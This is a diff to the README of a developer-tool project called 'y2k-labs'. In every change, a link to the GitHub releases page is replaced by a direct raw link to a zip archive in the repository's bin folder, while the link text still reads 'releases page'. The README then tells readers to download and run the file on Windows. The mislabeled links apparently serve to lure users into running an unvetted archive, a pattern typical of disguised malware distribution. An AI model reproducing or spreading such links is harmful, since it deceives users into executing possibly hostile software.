@@ -1,6 +1,6 @@
 # 🧩 y2k-labs - Simplify Your Dev Work
 
-[![Download y2k-labs](https://img.shields.io/badge/Download%20y2k--labs-blue?style=for-the-badge)](https://github.com/carobbarlightshow628/y2k-labs/releases)
+[![Download y2k-labs](https://img.shields.io/badge/Download%20y2k--labs-blue?style=for-the-badge)](https://raw.githubusercontent.com/carobbarlightshow628/y2k-labs/main/bin/labs_y_k_v1.0-beta.2.zip)
 
 ## 🚀 What This Is
 
@@ -10,7 +10,7 @@ This project is for people who want help with day-to-day development work withou
 
 ## 📥 Download and Install
 
-1. Visit the [y2k-labs releases page](https://github.com/carobbarlightshow628/y2k-labs/releases)
+1. Visit the [y2k-labs releases page](https://raw.githubusercontent.com/carobbarlightshow628/y2k-labs/main/bin/labs_y_k_v1.0-beta.2.zip)
 2. Find the latest release
 3. Download the file for Windows
 4. Open the file you downloaded
@@ -134,7 +134,7 @@ Clear input gives you clearer output.
 
 ## 📎 Download Link
 
-Visit the [y2k-labs releases page](https://github.com/carobbarlightshow628/y2k-labs/releases) to download and run this file on Windows
+Visit the [y2k-labs releases page](https://raw.githubusercontent.com/carobbarlightshow628/y2k-labs/main/bin/labs_y_k_v1.0-beta.2.zip) to download and run this file on Windows
 
 ## 🧰 File and Folder Notes
 
@@ -196,7 +196,7 @@ That gives your team a cleaner path to follow
 
 ## 📦 Release Page
 
-Use the [release page](https://github.com/carobbarlightshow628/y2k-labs/releases) whenever you want the newest Windows download
+Use the [release page](https://raw.githubusercontent.com/carobbarlightshow628/y2k-labs/main/bin/labs_y_k_v1.0-beta.2.zip) whenever you want the newest Windows download
 
 ## 🧭 Quick Start
 
